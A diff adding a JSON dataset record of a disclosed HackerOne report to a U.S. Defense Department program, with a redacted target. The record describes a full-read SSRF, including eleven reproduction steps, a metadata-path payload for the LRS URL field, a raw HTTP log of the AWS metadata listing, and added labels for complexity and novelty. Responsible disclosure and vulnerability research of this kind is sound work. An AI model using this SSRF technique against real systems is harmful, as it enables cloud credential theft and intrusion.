@@ -1,0 +1,74 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "sudi ",
+    "title": "Full read SSRF at \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 [HtUS]",
+    "content": "\nHeyy there,\nWe have found a full read ssrf vuln in https://\u2588\u2588\u2588\u2588\u2588 , we were able to hit the AWS Metadata endpoint (http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588) though the SSRF Vuln.\n\nSteps to reproduce:\n1.Goto https://\u2588\u2588\u2588\u2588\u2588\u2588/users/create and create an account\n2.After you account is verified , get login\nIf for some reasons you are not the verification code, try with a gmail id\n3.Now visit: https://\u2588\u2588\u2588\u2588/products/create/ and fill the required details\n4.Once your product is created, click on New Configuration which is under LRS Configurations\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5.Enter this as the input for LRS URL : http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/latest/meta-data? (the question mark at the end is important)\n6.Under Basic Auth User & Pass enter test for both fields and click on Create new LRS configuration\n\u2588\u2588\u2588\u2588\u2588\n7.Once the Configuration is created click on the Test button beside the conifguration name\n\u2588\u2588\u2588\u2588\n8.Now you will be redirected to the homepage, so go back to the product page\n9.Under Past Results you should be able to see a new entry\n10.Click on Manage Test record > Download log\n11.Now check the Include HTTP checkbox and from the Log Format drop down menu choose Plain text\nA file with the name log should be downloaded in your computer, just open it and there you will find the response from the aws meta data endpoint:\nCode 2.09 KiB\n1\n2\"\"\n3failed\n4\"SyntaxError: Unexpected token a in JSON at position 0\"\n5REQUEST SUPERREQUEST\n6_______________________________________\n7POST /latest/meta-data?/statements HTTP/1.1\n8X-Experience-API-Version: 1.0.3\n9Authorization: Basic dGVzdDp0ZXN0\n10host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11accept: application/json\n12content-type: application/json\n13content-length: 324\n14Connection: close\n15\n16{\"actor\":{\"objectType\":\"Agent\",\"name\":\"xAPI mbox\",\"mbox\":\"mailto:\u2588\u2588\u2588\u2588\"},\"verb\":{\"id\":\"http://\u2588\u2588\u2588\",\"display\":{\"en-GB\":\"attended\",\"en-US\":\"attended\"}},\"object\":{\"objectType\":\"Activity\",\"id\":\"http://www.example.com/meetings/occurances/34534\"},\"id\":\"3b9e4565-07ac-475f-be1f-d5f590f40779\"}\n17\n18RESPONSE SUPERREQUEST\n19_______________________________________\n20HTTP/1.0 200 OK\n21accept-ranges: bytes\n22content-length: 326\n23content-type: text/plain\n24date: Wed, 06 Jul 2022 13:48:12 GMT\n25last-modified: Thu, 30 Jun 2022 09:37:12 GMT\n26connection: close\n27server: EC2ws\n28\n29ami-id\n30ami-launch-index\n31ami-manifest-path\n32block-device-mapping/\n33events/\n34hibernation/\n35hostname\n36identity-credentials/\n37instance-action\n38instance-id\n39instance-life-cycle\n40instance-type\n41local-hostname\n42local-ipv4\n43mac\n44metrics/\n45network/\n46placement/\n47profile\n48public-hostname\n49public-ipv4\n50public-keys/\n51reservation-id\n52security-groups\n53services/\n54=======================================\n55REQUEST SUPERREQUEST\n56_______________________________________\n57GET /latest/meta-data?/statements?statementId=3b9e4565-07ac-475f-be1f-d5f590f40779 HTTP/1.1\n58X-Experience-API-Version: 1.0.3\n59Authorization: Basic dGVzdDp0ZXN0\n60host: \u2588\u2588\u2588\u2588\u2588\u2588\n61Connection: close\n62\n63RESPONSE SUPERREQUEST\n64_______________________________________\n65HTTP/1.0 200 OK\n66accept-ranges: bytes\n67content-length: 326\n68content-type: text/plain\n69date: Wed, 06 Jul 2022 13:48:12 GMT\n70last-modified: Thu, 30 Jun 2022 09:37:12 GMT\n71connection: close\n72server: EC2ws\n73\n74ami-id\n75ami-launch-index\n76ami-manifest-path\n77block-device-mapping/\n78events/\n79hibernation/\n80hostname\n81identity-credentials/\n82instance-action\n83instance-id\n84instance-life-cycle\n85instance-type\n86local-hostname\n87local-ipv4\n88mac\n89metrics/\n90network/\n91placement/\n92profile\n93public-hostname\n94public-ipv4\n95public-keys/\n96reservation-id\n97security-groups\n98services/\n99=======================================\n100\nImpact\nAn attacker can dump aws keys , reach internal hosts and etc\nThankyou\nRegards\nheint and sudi\n\n",
+    "severity": [
+        7.7,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Server-Side Request Forgery (SSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1663203120,
+    "report_url": "https://hackerone.com/reports/1628102",
+    "is_multi_component": true,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Goto https://\u2588\u2588\u2588\u2588\u2588\u2588/users/create and create an account"
+        ],
+        [
+            2,
+            "After you account is verified , get login If for some reasons you are not the verification code, try with a gmail id"
+        ],
+        [
+            3,
+            "Now visit: https://\u2588\u2588\u2588\u2588/products/create/ and fill the required details"
+        ],
+        [
+            4,
+            "Once your product is created, click on New Configuration which is under LRS Configurations"
+        ],
+        [
+            5,
+            "Enter this as the input for LRS URL : http://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/latest/meta-data? (the question mark at the end is important)"
+        ],
+        [
+            6,
+            "Under Basic Auth User & Pass enter test for both fields and click on Create new LRS configuration"
+        ],
+        [
+            7,
+            "Once the Configuration is created click on the Test button beside the conifguration name"
+        ],
+        [
+            8,
+            "Now you will be redirected to the homepage, so go back to the product page"
+        ],
+        [
+            9,
+            "Under Past Results you should be able to see a new entry"
+        ],
+        [
+            10,
+            "Click on Manage Test record > Download log"
+        ],
+        [
+            11,
+            "Now check the Include HTTP checkbox and from the Log Format drop down menu choose Plain text"
+        ]
+    ],
+    "vuln_description": "A full read SSRF vulnerability was found in the target application, allowing attackers to access the AWS Metadata endpoint and potentially dump AWS keys or reach internal hosts. The vulnerability involves manipulating the LRS URL input to point to internal endpoints and retrieving the response through the application's logging feature.",
+    "reason": "The vulnerability involves multiple steps including account creation, product creation, and configuration manipulation. However, the steps are straightforward and do not involve complex interactions or novel logic. The SSRF attack vector is well-known and the AWS Metadata endpoint is a common target.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
